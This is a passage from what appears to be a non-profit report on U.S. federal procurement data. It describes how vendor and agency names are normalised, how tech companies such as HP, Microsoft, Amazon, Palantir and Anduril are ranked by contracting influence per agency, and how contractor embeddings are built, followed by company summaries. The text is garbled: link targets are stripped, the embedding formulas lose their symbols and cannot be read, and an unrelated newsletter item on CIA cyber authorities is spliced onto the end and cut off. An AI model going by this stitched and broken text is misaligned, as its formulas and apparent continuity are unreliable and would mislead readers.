While our JEDI award example properly provided Microsoft's (lowercased) name as "microsoft corporation", this is far from always the case. Our [current normalization map]( includes corrections from the encountered misspellings: "microsoft corporation sitz in", "microsoft corporation sitz in redmond corporation", and "microsoftcorporation".
To demonstrate why we also allow for the restriction of vendor name modifications to particular DUNS numbers, we take the -- exceedingly complicated -- example of the [major]( defense contractor [Science Applications International Corporation]( (SAIC).
In 2013, the company decided that it could avoid legal barriers arising from conflicts between different contracts by [splitting]( off its legacy national security unit. Rather than making the reasonable choice of giving the spun-off company a new name, because the spin-off would be maintaining legacy contracts, they gave the spin-off the name SAIC and renamed the parent company [Leidos]( (taken from the middle of the word "kaleidoscope").
As a result of the SAIC corporate shell game, knowing when to rename an occurrence of "SAIC" to "Leidos" requires knowledge of an extensive list of DUNS numbers (it turns out, more than 60 in this case) to build custom normalization rules around. These rules, and more than 9000 others, can be found in our [vendor normalization map](
Normalizing Requesting and Contracting Agencies
As was the case for vendor name spellings, we can substantially improve the accuracy and consistency of the listings for the contracting and requesting agencies for an award. Our above approach can be adopted through the analogy: DUNS is to vendor name as office name is to agency name. That is, we build a normalization map that corrects listed agency names and provide overriding exceptions for specific pairings of offices and agencies.
For example, in the Microsoft JEDI award of [Figure 1]( the requesting agency identifier sets both the " (which typically refers to the agency level) and " (which typically refers to the parent department of the agency) to "DEPT OF DEFENSE". A reasonable default rule is to normalize such a pairing to a unique string associated with the DoD -- we standardized on "Defense".
But we have the side information that the requesting office name was given as "DOD CIO", which refers to the DoD's Chief Information Officer. We therefore override our agency normalization map to normalize to "Defense: OCIO" when the agency was simply listed as the DoD but the office name is "DOD CIO". This rule, along with more than 650 others, can be found in our current [agency normalization map](
We note that there exist interesting agencies, such as the [National Security Agency]( and the [National Reconnaissance Office]( which we have only observed through the requesting office rather than the requesting agency. And several other agencies, such as the [Defense Intelligence Agency]( (DIA), are often obscured as simply being the Department of Defense in the agency field -- in the case of the DIA, we often made use of the office being an obvious reference to the [Defense Attache System]( We corrected many such improper coarsenings up to the Department of Defense via a manual review of the list of all occurring pairings of agencies and offices.
Mapping Out Parent Companies and Subsidiaries
The defense contracting space is notorious for its frequent mergers, acquisitions, spin-offs, and even more exotic exchanges, such as the [spin-merger]( For example, when we colloquially refer to "Hewlett Packard", we mean a network of four affiliates: the personal computer company [HP Inc.]( the enterprise IT provider [Hewlett Packard Enterprise]( (HPE), HPE's B2B spin-merge [DXC Technology]( DXC's spin-off of its public sector segment, [Perspecta]( and all of their subsidiaries.
Two of HPE's major subsidiaries include:
- [Cray Inc.]( the historically preeminent supercomputer manufacturer that has been [critical]( to the NSA's signals intelligence and continues to prove foundational to [Department of Energy]( [supercomputers]( and
- [HPE Government, LLC]( which includes the remnants of high-performance graphics company [Silicon Graphics, Inc.]( (SGI).
When we speak of the sum of contracts between HPE and a particular agency -- for example, the [Defense Information Systems Agency]( -- we could either be referring to the contracts awarded directly to HPE (an "exclusive" count), or all awards to HPE, HPE Government, Cray, and its other subsidiaries (an "inclusive" count). For this report, we focus on inclusive counts.
As mentioned in our discussion of the [JEDI award]( FPDS [DUNS]( information sometimes provides a hint for a single parent company. But, for the same reasons which we avoid overdependence on DUNS information for unique vendor identifiers, as well as the fact that many companies have multiple parents (e.g., all [joint ventures]( we manually curate our own JSON map of parent companies. Our [current map]( contains more than 5000 parent links, which, in combination with our vendor and agency normalization maps, allows us to automate inclusive award sums for a large number of pairings of vendors and agencies.
As another layer of complication, we consider HP, HPE, and Perspecta to be affiliates, not parents or subsidiaries of each other. And so when we compute influence rankings of the nebulous "Hewlett Packard" network, we use the maximum influence ranking between HP, HPE, and Perspecta. In almost all cases, this corresponds to Perspecta's influence rank.
Logistics of Data Retrieval and Indexing
At this point, we are ready to describe the construction of a table of [direct contracting influence]( rankings, but we take the opportunity to add in the logistical details of efficiently retrieving, searching, and summarizing the federal procurement data.
As mentioned in the FPDA ATOM feed [FAQ]( each pull from the ATOM feed is limited to retrieving only ten records, but up to ten simultaneous requests are allowed -- which combines to up to 100 simultaneous award requests. Given that 30,000 to 100,000 award modifications are not unusual, performing multithreaded retrievals leads to very significant savings (often, from an hour down to a few minutes). And while the FAQ recommends 9AM ET retrievals, we find that the data is typically available around 1:30AM ET.
One can get an idea of the storage requirements for mirroring and indexing the entire FPDS database by reading the [USASpending.gov]( [database guide]( more than 1.5TB of hard disk space are required for their system. Getting access to this much space on [DigitalOcean]( would cost $500 per month, which is out of the price range of our small, grassroots non-profit.
We therefore adopt a two-tiered approach: we store an entire copy of the raw FPDS data (converted into JSON via python's [xmltodict]( module) on a private workstation and export salient subsets to CSV for loading into a [Postgres]( database with [full-text]( search indices. We then expose an interface to the indices via our public website, techinquiry.org/lobbying/, which is a straight-forward combination of [Express.js]( [jQuery]( [Pug]( and [Leaflet](
Addresses for companies are retrieved from the procurement awards and geocoded via a combination of [geocodio]( (for U.S. addresses) and [Nominatim]( (for international addresses).
Our lists of "similar contractors" for vendors are generated by extracting nearest neighbors from the results of the embedding processed, which we execute on a private workstation, described in a [later section](
Building a picture of direct contracting influence
We can now combine all of the previously discussed FPDS curation mechanisms to compute maximum ranks of direct financial flow between various tech-related companies and U.S. federal agencies -- which we treat as proxies for influence/impact. Brief [summaries]( of many of the studied companies are available in a section of the appendix.
For the sake of brevity, we will simply list the agencies of focus rather than providing short summaries. One exception is the Justice Department's Offices, Boards, and Divisions (OBD) unit, which is less widely documented. We recommend the book [Badges without Borders]( (or the associated [interview]( with [Historic.ly]( which details the history of the international, often explicitly anti-communist, policing programs once run through USAID's [Office of Public Safety]( These programs transitioned into the Justice Department's [International Criminal Training Assistance Program]( (ICITAP) under the OBD agency. There are [numerous]( recent awards from this program to [Science Applications International Corporation]( and its subsidiary, [Engility Holdings]( for international policing in Indonesia, the Kingdom of Saudi Arabia, and Pakistan.
For the [Justice Department]( as a whole, we investigate rankings within:
- [The Federal Bureau of Investigation]( (FBI), [24]
- [The Drug Enforcement Administration]( (DEA),
- [Offices, Boards, and Divisions]( (OBD), and
- [The Federal Bureau of Prisons]( (BoP).
From the[Treasury Department]( we only include the [Internal Revenue Service]( (IRS).
Several members of the [Department of Homeland Security]( are of interest:
- [The U.S. Secret Service]( (SS),
- [Immigration and Customs Enforcement]( (ICE),
- [Customs and Border Protection]( (CBP),
- [U.S. Citizenship and Immigration Services]( (CIS),
- [The Transportation Security Administration]( (TSA), and
- [The Science and Technology Directorate]( (S&T).
The largest number of agencies are from the [Department of Defense](
- [The U.S. Air Force](
- [The U.S. Navy](
- [The U.S. Army](
- [The U.S. Special Operations Command]( (SOCOM),
- [The Defense Intelligence Agency]( (DIA),
- [The Defense Logistics Agency]( (DLA) and [The U.S. Transportation Command]( (TRANSCOM),
- [The Washington Headquarters Service]( (WHS),
- [The Defense Information Systems Agency]( (DISA),
- [The Defense Advanced Research Projects Agency]( (DARPA),
- [The National Geospatial-Intelligence Agency]( (NGA),
- [The National Security Agency]( (NSA) and [U.S. Cyber Command]( (CYBERCOM).
Lastly, we include rankings within several independent agencies:
- [The State Department](
- [The U.S. Agency for International Development]( (AID),
- [The U.S. Agency for Global Media]( formerly known as the Broadcasting Board of Governors (BBG), and
- [The General Services Administration]( Federal Acquisition Service (FAS).

Table 1: Corporate influence rankings by contracts directly between various tech-related companies and U.S. agencies between the beginning of 2016 and July 4, 2020. Measurements were generated by combining all awards listed in the Federal Procurement Data System (FPDS) which were signed or modified within the time window. In order to smooth out known inconsistencies and FPDS data, companies were ranked by each of the three ways to measure contract values (obligated, current, and potential) and their influence was set to the most significant (that is, smallest) of the three ranks. These influence rankings were then binned as either: top 10 (), top 25, (), top 50, (), top 100, (), top 250, (), top 500 (), top 1000 (), or below (). If a company was not observed contracting with an agency, the square was left white. The numerical influence rankings are shown on mouse-over.
Even though we have restricted the analysis behind the influence rankings in [Table 1]( to direct contracts -- which misses, for example, a high-profile $25M (base and all options value) [award]( between [TRANSCOM]( and Amazon through [ECS Federal]( -- we can interpret the results as underestimates. Given this caveat, we immediately notice that the Hewlett Packard network of companies noticeably dominate, with top-10 influence rankings in 8 of the 26 agencies. [25]
Equally as surprising is that consulting companies [Accenture]( and [Deloitte Consulting]( -- which contributed much of the award money to parent company Deloitte -- were more influential via direct contracting than essentially every tech company except HP and IBM. Next after the management consulting companies is the not-for-profit [MITRE Corporation]( which was built specifically to manage [Federally Funded Research and Development Centers]( (FFRDCs); its high rankings should thus serve more as a benchmark than a surprise. We underline that it ranked first with the DIA, NGA, and DHS S&T, and second with the FBI.
If we restricted our attention to the ["Big Five"]( tech companies: Google, Apple, Facebook, Amazon, and Microsoft, then a purely direct contracting analysis would suggest that Microsoft is the only significant defense contractor -- which, again, misses the numerous multi-million dollar Amazon Web Services awards passed through subcontracts (such as [ECS Federal]( and [JHC Technology]( The question of how to account for more commoditized relationships -- namely, Intel, NVIDIA, and Apple hardware sales -- is more complicated, and we will partially address it in the next section.
We also notice the minor influence rankings of Palantir and Anduril relative to: management consulting companies, HP, Dell, telecoms, and even the Johns Hopkins [Applied Physics Laboratory]( (which is responsible for the vast majority of awards to Johns Hopkins). Palantir's highest influence was within the U.S. Special Operations Command, who [publicly]( praised Palantir's software during their years-long struggle to win the [DCGS-A]( contract (and a subsequent ["capability drop"]( Anduril's biggest influences are observed as through DARPA, the Washington Headquarters Service, and Customs and Border Protection; [direct inspection]( of their awards reveals, for example, a $250M (base and all options value) award through CBP for "autonomous surveillance towers" and a $100M (base and all options value) award requested by DARPA and contracted through the Air Force for "advance[d] battle management anduril phase 3 idiq". [26, 27]
A few of the agency columns are worth dedicated discussion. For example, Microsoft's second place influence rank within the Defense Information Systems Agency is entirely due to the $10B (base and all options value) JEDI award -- only [Leidos]( ranked higher -- and so the award being transferred to Amazon due to a [bid protest]( would give it the same position. The other top-ten influencers within DISA, unsurprisingly, included several communication infrastructure companies: Verizon, Cisco, and AT&T, as well as HP (IBM was 18th, and Dell was 26th).
The column combining the National Security Agency and the U.S. Cyber Command -- which we note only has a modest amount of reported awards -- contains top-ten rankings for Accenture (3rd) and Johns Hopkins (5th), but known NSA contractors [Dell]( and [AT&T]( were only 28th and 70th, respectively. The FBI rankings, like many others, show the professional services companies, Accenture and Deloitte, as heavier-hitters than tech giants. Nevertheless, Perspecta and IBM are both in the top 25, [Verizon]( and Palantir are in the top 50, and Dell and AT&T are in the top 100.
As we will see in the next section, Palantir and Anduril's results are not significantly changed by incorporating subcontracts -- indeed, Anduril's are not changed at all -- and so, if they are setting the bar for what it means for a tech company to be a defense contractor, then HP, IBM, Microsoft, Dell, Cisco, AT&T, and Verizon are more than meeting it, even without incorporating their subcontracting passthroughs. And that Intel chips are a core component of most HP and Dell machines suggests we should already be able to justify its addition it into the list.
Incorporating Conservative Subcontracting Passthrough Estimates
We now discuss our approach for incorporating conservative subcontracting estimates into the direct contracting influence rankings of the last section (summarized in [Table 1]( Our approach was simple, yet exceedingly laborious:
- Generate a list of awards whose descriptions include key terms (we built a custom API to return such lists in a minimal JSON format).
- Manually remove all awards not attributable to the target company after direct inspection.
- Expand out to the entire award series of those that remain and annotate each such award with an estimated passthrough percentage.
- Augment the three types of total award amounts from the direct award analysis by adding in the products of the subcontract values and their estimated passthrough rates.
- Re-rank.
In practice, we combine steps (2-4) so that we need only perform a single pass through the original list. And we first sort the awards by maximum absolute value so that the most impactful items are handled first.
This process was repeated for ten companies, and, when restricted to our agencies of study, resulted in:

*: We emphasize that these counts of the number of manually annotated contracts -- which we colloquially described as the number of "kept subcontracts" -- contain a small percentage of awards that simply make reference to the company in question. In such cases, the percentage of money estimated to be passed through to the company is set to zero. Such awards are kept in the list to help demonstrate that a simple keyword search is insufficient.
As part of the subcontract review process, we noticed that, during the 2005-2011 time period that an [Alaska Native]( subsidiary, [Eyak Technology]( was operating a [kickback scheme]( relating to its billion-dollar prime contract with the U.S. Army Corps of Engineers, it was also serving as a supplier of Google technology to the U.S. Army through numerous awards in 2009. We also discovered that Amazon, through [JHC Technology]( has received several million dollars in AWS cloud contracts through the [Federal Bureau of Prisons](
It also became clear that many of the NVIDIA [subcontracted awards]( were for the acquisition of their [DGX]( compact [General-Purpose Graphics Processing Unit]( (GPGPU) supercomputers. Recipients included: The Army, Navy, Air Force, Washington Headquarters Service, and, most surprisingly, even Veterans Affairs.
While we would have preferred to have performed similar analyses for the remaining companies, we remind the reader that such analyses only increase ranks. Thus, incorporating any missed subcontracts for HP, Deloitte, IBM, AT&T, Verizon, and Dell would only make them more dominant. The opportunities for significant qualitative change are with extending our subcontract analysis to Appl, Cisco, Oracle, and Intel.

Table 2: Corporate influence rankings by a combination of direct contracts and subcontracting passthroughs between various tech-related companies and U.S. agencies between the beginning of 2016 and July 4, 2020 (subcontract analysis only included up to June 20). Direct contract measurements are generated in the same manner as for Table 1. Conservative subcontract passthroughs were estimated and incorporated for companies annotated with '*' through manual review of thousands of FPDS awards whose descriptions mentioned the company or one of its major products (e.g., "aws govcloud"). Due to the intense time demands of manually reviewing tens of thousands of awards, several companies were not augmented with subcontracting passthrough estimates. These influence rankings were then binned as either: top 10 (), top 25, (), top 50, (), top 100, (), top 250, (), top 500 (), top 1000 (), or below (). If a company was not observed contracting with an agency, the square was left white. The numerical influence rankings are shown on mouse-over.

Table 3: A restriction of [Table 2]( to tech companies.
The results of incorporating our [subcontracting estimations]( are demonstrated in [Table 2]( and its restriction to tech companies, [Table 3]( The most significant qualitative difference is with Amazon, whose large numbers of Justice, DHS, and DoD cloud contracts are almost entirely through intermediaries, such as [Four Points Technology]( [JHC Technology]( and [ECS Federal]( (who was also the prime contractor for Google's [Maven]( contracts).
Another significant change is that Microsoft moves into the top 10 influencers within the Justice Department's Offices, Boards, and Divisions. As we explained in a previous section, this little-known agency is the current home for U.S. international policing program [ICITAP]( We also notice that Google has moved into the top 500 contractors with the FBI (through supplying [FISMA]( [Google Apps for Government](
Google, Facebook, and Twitter's contracting with the U.S. Agency for Global Media -- which is formerly known as the Broadcasting Board of Governors, which itself grew out of the propaganda-focused [Information Agency]( -- as well as USAID, and, to a lesser degree, The State Department, became more pronounced. As did minor amounts of contracts with the TSA.
The conservative estimation of relative financial flow between major tech companies and various military, prosecutory, law enforcement, and diplomatic organizations in [Table 3]( makes clear that each of these companies is playing at least a minor support role to the U.S. government. And, in the cases of: HP, IBM, Microsoft, Dell, Amazon, Cisco, Palantir, Oracle, NVIDIA, and Anduril, these roles are significant. In light of this data, continuing to claim that Silicon Valley has abandoned Washington would be disingenuous -- even if one technically excluded Microsoft, Amazon, and IBM.
Generating Contractor "Embeddings" and Nearest Neighbors
The original motivation for mirroring the entire U.S. federal procurement database was to answer the question:
More specifically, the goal was to generate glue between otherwise siloed company profiles through the[nearest neighbors]( resulting from the left factor of a weighted low-rank approximation to the co-occurrence score matrix between terms from the contract description, the vendor receiving the award, and the contracting and requesting agencies.
Variants of such an approach are at the heart of many commercial recommendation systems -- which have been frequently criticized as being both [unacceptably opaque]( and detrimentally [engagement driven]( We repurpose a basic variant here for the purpose of exploring federal contracting. Given that the resulting recommendations only involve federally mandated records of corporate entities, and our site is not monetarily incentivized by engagement (we are a non-profit and we do not sell ads), we do not forsee any analogues of the typical failure modes.
We assert no conclusions about the resulting nearest neighbors, other than that they often contain companies which contract in similar areas to the generating company. They are simply useful for expanding one's breadth of knowledge of companies.
Our Approach to Generating Similar Contractor Lists
We built such a system on top of [SciPy]( a stand-alone Alternating Weighted Least Squares (AWLS) embedding and nearest neighbor extraction [utility]( and a [driver]( specific to the Federal Procurement Data System.
After the
co-occurrence score matrix,, is formed -- which, to be clear, is where most the "art" of this model resides [28] -- the objects of interest are the rows of the tall-skinny matrix in the low-rank matrix , which approximates the co-occurrence matrix, in the sense of approximately, locally minimizing given a nonnegative weight matrix with a particular sparse plus rank-one structure, represents the [entrywise product]( is the entrywise square-root, and
is the [Frobenius norm](
More specifically, the weight matrix is required to be of the form
is a binary matrix with the same sparsity pattern as the co-occurrence score matrix,- ,
is a length-- column vector of ones,
- , and
- The
'th entry of vector is analogous to the [tf-idf]( weighting for item represented by the
- 'th column.
We standardized on, , a rank of 150, and 10 alternating iterations. And to keep memory usage and runtimes in check, the rows of the co-occurrence matrix were restricted to the dominant 50,000 terms, 150,000 vendors, and 25,000 agencies. Likewise, the columns were restricted to the dominant 75,000 terms, 150,000 vendors, and 100,000 agencies.
Given such a structure for the weight matrix, it was [shown]( by Hu, Koren, and Volinsky in 2008 -- incidentally, while working at two companies studied in this report, AT&T and Yahoo! -- that each factor update could be formed in linear time by precomputing a certain 'background' [Gramian]( and sparsely updating it to solve the normal equations for each row's update.
After the final iteration of the minimization process is completed, we normalize each row of the matrix
to have unit Euclidean norm and then extract 20 to 30 of its nearest neighbors, in a cosine-similarity sense.
Examples of Generated Neighbors
Each of the "vendor" pages on the website associated with this report, techinquiry.org/lobbying/, contains a list of "Similar Contractors" within the "US Federal Contracting" tab that are generated with the algorithm described above. We show a few of the examples from our most recently trained model, which was trained on roughly the last year and a half of procurement data.
Our first example is that of [Cellebrite]( a "mobile forensics" company which has [allegedly]( been used by Michigan State Police to conduct unlawful searches. It has also been [reported]( that Cellebrite sells its software to the governments of Turkey, the United Arab Emirates, and Russia.
The five closest neighbors produced for [Cellebrite Inc.]( a subsidiary of [Cellebrite DI Ltd.]( di ltd./), were:
- [Cellebrite DI Ltd.](
- [Grayshift, LLC](
- [Pen-Link, Ltd.](
- [Avail Forensics LLC](
- [Berla Corporation](
We note that these five neighbors were chosen out of the set of more than 130,000 companies kept by the truncation procedure described above. Given that the parent company was picked up as the nearest neighbor, and the other four are also forensics companies, we believe that these are quality results.
Palantir Technologies
We return to investigate the answers to our original question: "Which companies contract like Palantir [Technologies]?". Our top-five results are:
- [XFinion Inc.](
- [Ardent Management Consulting, Inc.](
- [VIRE Consulting, Inc.](
- [iWorks Corporation](
- [Alethix, LLC](
Anduril Industries
Similarly, the top-five results for [Anduril]( industries%2C inc./) are currently:
- [Orbital Insight, Inc.](
- [Solid State Scientific Corporation](
- [Omni Fed LLC](
- [G2 Ops, Inc.](
- [Entheleon Technologies, Inc.](
[Orbital Insight]( markets itself with the blurb:
and[Solid State Scientific Corporation]( appears to focus on applying machine learning to Air Force problems, much like Anduril.
Microsoft Corporation
Given that our nearest neighbors lists are generated entirely from contracting behavior, they produce lists of companies which contract similarly to the given company, rather than companies which are, in a vague sense, generally thought of as similar. This distinction becomes clear when we look at a very large tech company like Microsoft.
The most recently produced top-five list of vendors who contract similarly to [Microsoft]( corporation/) was:
- [Four Inc.](
- [Dynamic Systems, Inc.](
- [Forcepoint Federal LLC](
- [Emergent LLC](
- [Accelera Solutions, Inc.](
According to Forcepoint Federal's own[brochure]( they are a subsidiary of weapons manufacturer Raytheon formerly known as Websense.
Future Extensions of Embeddings
There exist namebrand tech companies -- for example, Google -- which do very little direct federal contracting, but perform a large amount of registered lobbying. We can therefore expect to improve the quality of "similar companies" recommendations by extending from our current procurement-only approach to one which includes Senate [OPR LD-1/LD-2]( and [LD-203]( filings. We have already included said filings in our website, but have not yet worked them into the embedding/neighbor generation pipeline.
Conclusions and Future Work
We have demonstrated a framework for converting the Federal Procurement Database System (FPDS) into a set of rankings meant to indicate the degree of (financial) influence of a company, including its subsidiaries, within a particular government agency -- including some which are only indirectly indicated in procurement data. When we applied this methodology to major tech companies, and augmented the award amounts with conservative estimates of subcontract passthrough amounts, we demonstrated that recent narratives decrying a massive divide between Silicon Valley and the military are anecdotal and qualitatively false.
We also demonstrated a recommendation system for automatically generating lists of similar contractors for the vast majority of -- more than 130,000 -- U.S. federal contractors. We plan to extend these "embeddings" to incorporate U.S. registered lobbying data, and provide a similar map of tech company lobbying influence, in a future report.
One of the fundamental missing features of our website is a means of accepting user-contributed corrections and additions -- ideally coupled with citations that could be verified before their inclusion. We hope to begin experimenting with such interfaces alongside our incorporation of more datasets (e.g., Canadian and European procurement records).
Lastly, as a means of both connecting our work to that of Mijente's ["Who's Behind ICE?"]( report and demonstrating the breadth of our database's coverage, we provide a [subsection]( of the appendix that links to our profile page for each company mentioned in their report. A similar [map]( is provided from a collection of contractors with the Defense Innovation Unit -- and its spin-out, [Kessel Run]( -- that we curated. An autocomplete interface is also provided for each via the "DIU" and "Who's Behind ICE?" radio options on techinquiry.org/lobbying/. We have also incorporated the [Project on Government Oversight]( [Pentagon Revolving Door]( and [Federal Contractor Misconduct]( databases but refrain from listing them in this report.

Company Summaries
- [HP Inc.]( / [Hewlett Packard Enterprise Company]( (HPE) / [Perspecta Inc.]( Each of these three companies has roots in the (now defunct) [Hewlett-Packard Company]( which [formed]( its HP Enterprise Services division after acquiring the remnants of [Ross Perot]( [Electronic Data Systems]( in 2009; HP formally split into a personal computer business (HP) and an enterprise IT company (HPE) in 2015. The following year, HPE acquired the remains of the high-performance graphics company, [SGI]( And in 2017, HPE spun off its enterprise services segment, and merged it with the [Computer Sciences Corporation]( to form [DXC Technology]( About six months later, DXC spun out its public sector business and merged it with [Vencore]( which had previously acquired the North American division of a privatized British intelligence agency, [QinetiQ]( to form Perspecta.

Rather than summing the award amounts from HP, HPE, and Perspecta, we individually rank them and then take the highest ranking result (in almost all cases, that result is from Perspecta).
- [Deloitte]( Deloitte Touche Tohmatsu Limited is a British accounting firm considered one of the "Big Four". In 2002, Deloitte [acquired]( both the British and Canadian branches of [Arthur Andersen]( which was convicted of destroying documents in the [Enron scandal]( Deloitte has subsequently been under investigation by the UK's [Financial Reporting Council]( for [failing]( in its role as an external auditor of, [Autonomy]( which was the largest software company in the UK at the time of its 2011 acquisition by Hewlett-Packard. Almost immediately after Autonomy was acquired by HP, most of its value was written down as a loss, partly due to said accounting irregularities (in 2017, HP sold Autonomy to [Micro Focus]( and, in 2019, Autonomy's former CFO was given a [five year]( prison sentence in the US for fraud).
- [Accenture plc]( Accenture was the consulting division of [Arthur Andersen]( from the 1950s until it became a separate unit called Andersen Consulting in 1989, then an independent company in 2000, and then officially became Accenture at the beginning of 2001. After the Enron scandal became public at the end of 2001, Accenture issued a [statement]( clarifying this timeline of its separation from Arthur Andersen. In 2002, the Government Accountability Office issued a [report]( critiquing Accenture as one of the four publicly traded federal contractors incorporated in a tax haven -- alongside [McDermott International]( [Foster Wheeler]( (now [John Wood Group]( and [Tyco International]( (now [Johnson Controls]( In April of 2019, the DHS's Customs and Border Protection [terminated]( a contract with Accenture's subsidiary, Accenture Federal Services, over having paid 297 million dollars for the company to process just 58 job applicants.
- [IBM]( International Business Machines Corporation (IBM) is one of the largest employers in the world, and its [IBM Cloud]( platform is a major competitor for federal cloud contracts. Some of IBM's inventions include the [relational database]( and the [Structured Query Language]( which are both employed in this project. But the company has a history of profiting from severe human rights abuses. IBM's most famous founder, [Thomas J. Watson]( personally [spearheaded]( the company's role in [Nazi Germany]( cataloguing systems for exterminating its Jewish population. More recently, IBM's international sales of ["safe city"]( technology have involved the construction of video surveillance networks for strongman [Rodrigo Duterte](
In 2011, IBM acquired military intelligence software company [i2 Group]( which received $10M from Palantir after alleging [fraudulent]( theft of its intellectual property. Conflicts with IBM's i2 intensified over Palantir's attempted replacement of the Army's intelligence integration software, [DCGS-A]( -- members of the Army, and Congress, [suggested]( DCGS-A weaknesses were the cause of the U.S. [bombing]( of a Doctors without Borders hospital in Kunduz. Palantir ultimately [won]( DCGS-A.
- [AT&T Inc.]( As chronicled in [The Idea Factory]( AT&T played a foundational role in the development of computing and communication equipment, beginning with its deployment in the early twentieth century of vacuum tubes as a means of amplifying long-distance telephone call signals. The company's long-running monopoly was partially due to its large-scale construction of US [communication networks]( during both World Wars. One of the positive byproducts of their monopoly was a golden era of innovation at its [Bell Labs]( whose end loosely coincided with the 1984 [antitrust decree]( breaking up the Bell System (the pieces have since reassembled into: AT&T, Verizon, and CenturyLink). The past two decades have revealed a darker side to AT&T's close relationship with the US government: numerous [documents]( and [whistleblowers]( have shown that the company has been eager to comply with large-scale [warrantless surveillance]( and [call monitoring](
- [Microsoft Corporation]( One of the "Big Five" tech companies, it famously won the -- still [heavily contested]( -- [Joint Enterprise Defense Infrastructure]( (JEDI) cloud competition with its [Azure]( platform. Along with Google and Yahoo (now Verizon), it cofounded the [Global Network Initiative]( (GNI) in 2008, partially to avoid [Congressional intervention]( in response to [numerous]( international [human rights]( [violations]( Despite its GNI membership, Microsoft followed Google's [lead]( by complying with Chinese government [censorship]( and surveillance demands when it launched its search engine, Bing, in China in 2009. Microsoft further took stewardship of the [dissent suppression]( mechanisms in professional networking site LinkedIn after acquiring it in 2016. A 2010 [report]( had similarly revealed that Bing was extensively suppressing LBGT-related content in Arab countries. And, after Google [pulled back]( from proactively suppressing dissent in its Chinese localization of its Search product in early 2010, Microsoft's founder, Bill Gates, personally [attacked]( Google's principled stand as hypocritical.
- [Verizon Communications Inc.]( Verizon has its [roots]( in one of the "Baby Bells" resulting from the 1984 breakup of AT&T: Bell Atlantic. It expanded into Silicon Valley through the purchase of [AOL]( in 2015, and then the non-[Alibaba]( assets of [Yahoo!]( in 2016, and the combined the two into a subsidiary known as Oath, which then rebranded as [Verizon Media Group]( In 2006, Nobel Peace Prize laureate [Liu Xiaobo]( wrote an [open letter]( to Yahoo!'s then chairman, Jerry Yang, arguing that the company had caused the arrest of journalist Shi Tao as part of their negotiations for their stake in Alibaba. As was widely [reported]( in 2013, Verizon's Business Network Services division had been turning over "all call detail records" to the National Security Agency. Similar "warrantless wiretapping" had previously been [reported]( We also note that subsidiary [Verizon Business]( performed an analysis of the hacking of intelligence consulting company Stratfor that is ["key"]( to the Department of Justice's current indictment of WikiLeaks.
- [Dell Technologies, Inc.]( Dell Technologies is the result of the 2016 [merger]( between [Dell]( and enterprise storage company [EMC Corporation]( (now [Dell EMC]( before going public at the end of 2018, it was the largest privately held company in the world.

- [Cisco Systems, Inc.]( A networking company founded by two Stanford computer scientists and named after San Francisco, Cisco was the most valuable company in the world just before the dot-com bubble burst. In the early 2000s, Cisco sold the Chinese government routers that served as the [backbone]( of its ["Great Firewall"]( -- [allegedly]( going so far as [designing]( a custom video surveillance and censorship module to target a dissident religious group.

As noted above, Palantir intensely competed -- and ultimately [won]( -- against a consortium of defense contractors (including IBM's i2) to replace the Army's [DCGS-A]( intelligence synthesis tool with its [Gotham]( software (our FOI for Palantir's [DIU contract]( to build a LOGistics Common Operating Picture (LOGCOP) is for analogous functionality).
In the early days of the company, Gotham was presented as a tool for data-driven civic engagement -- which are disturbingly similar to some of the goals of the [website]( behind this report -- via their (now defunct) procurement and lobbying analysis website [AnalyzeThe.US]( One of their other products, Metropolis -- which they ultimately replaced with [Foundry]( -- was used by [JPMorgan]( to [spy]( on its employees' emails, phonecalls, web-browsing patterns, and GPS locations to attempt to predict disgruntled employees ("insider threats"). And, as [reported]( by LatinX organizing group [Mijente]( Palantir, through its contracts with ICE's [Homeland Security Investigations]( (HSI) unit, has "played a key role" in the Trump administration's accelerated arrest and deportation of immigrants.

- [Oracle Corporation]( Oracle, was incorporated in 1977 and named after the founders' work with the CIA -- who was their [first customer]( -- on the [Project ORACLE]( data storage system. As detailed by [numerous]( [sources]( surveillance work remained critical to the company's growth, with $2.5B of its [2003 revenue]( coming from federal contracts. Oracle's intense growth led to a major downfall in the integrity of the U.S. Justice Department when the former Attorney General, [John Ashcroft]( left office in 2005 to form a lobbying shop, The Ashcroft Group, LLC (now [TAG Holdings LLC]( which accepted [$220,000]( from Oracle to help [reverse]( an anti-trust hold on an acquisition that he had put in place.
In 2012, Oracle was [banned]( from a General Service Administration procurement vehicle after paying $200M to the GSA the previous year to settle an overbilling lawsuit through the [False Claims Act]( (five years earlier, Oracle's [PeopleSoft]( paid $99M to the GSA due to another overbilling case). Nevertheless, Oracle has been a [litigious]( participant in the ongoing Joint Enterprise Defense Infrastructure bid protests, having hoped that its [Oracle Cloud]( platform would be at least partially adopted rather than the award going entirely to one of its rivals.
- [Anduril Industries, Inc.]( Roughly three years after Palmer Luckey's virtual reality company, [Oculus]( was acquired by Facebook in 2014, Facebook was [ordered]( to pay $500M to [ZeniMax Media]( for his failure to comply with a non-disclosure agreement -- so they [fired]( him. He was subsequently [inspired]( by Peter Thiel's [Founders Fund]( to transition into weapons contracting. One of the first projects of his new company, Anduril, was a contract with the Department of Homeland Security building surveillance systems for the U.S.-Mexico border. And, after Google publicly cancelled its work building object tracking AI's on top of drone surveillance footage for the Air Force's Joint Artificial Intelligence Center -- called Project Maven -- Anduril was [one of]( the companies to take over the work.

1 big thing: The CIA's new license to cyberattack
In 2018, President Trump granted the CIA expansive legal authorities to carry out [covert actions in cyberspace]( providing the agency with powers it has sought since the George W. Bush administration, former U.S. officials directly familiar with the matter told Yahoo News.
Why it matters: The CIA has conducted disruptive covert cyber operations against Iran and Russia since the signing of this presidential finding, said former officials.
Driving the news: According to the Yahoo News story, of which I am the lead author, the 2018 covert action finding gives the CIA much more power to undertake such operations without needing prior approval from the National Security Council.
- Under the Obama administration, U.S. officials would discuss proposals for specific potential covert actions for months, or even years, before signing off on them, former officials said.
- Now they can go “from idea to approval in weeks,” a former U.S. official told Yahoo News. And many proposals can now circumvent the NSC entirely, said former U.S. officials. “Trump wanted to push decision-making to the lowest possible denominator,” said another former U.S. official — which means many of these decisions are now being made in-house within the CIA, said former officials.
Of note: These new powers are not related to the CIA’s ability to hack for the purpose of mere intelligence-gathering, said former officials.
- Instead, they are about creating real-world effects like degrading or destroying adversaries’ infrastructure or exposing rival intelligence services’ secrets, said these officials.
- The CIA’s new authorities have allowed it to more freely engage in “hack-and-dump” operations of the sort popularized by Russian intelligence via WikiLeaks, where pilfered data is leaked to journalists or released online via personas like Guccifer 2.0, the online front used by Russian operatives to publicize the 2016 hack of the DNC, said former U.S. officials.
- The CIA has already dumped Russia- and Iran-related tranches of data online, said former officials.
Other impacts of the 2018 finding:
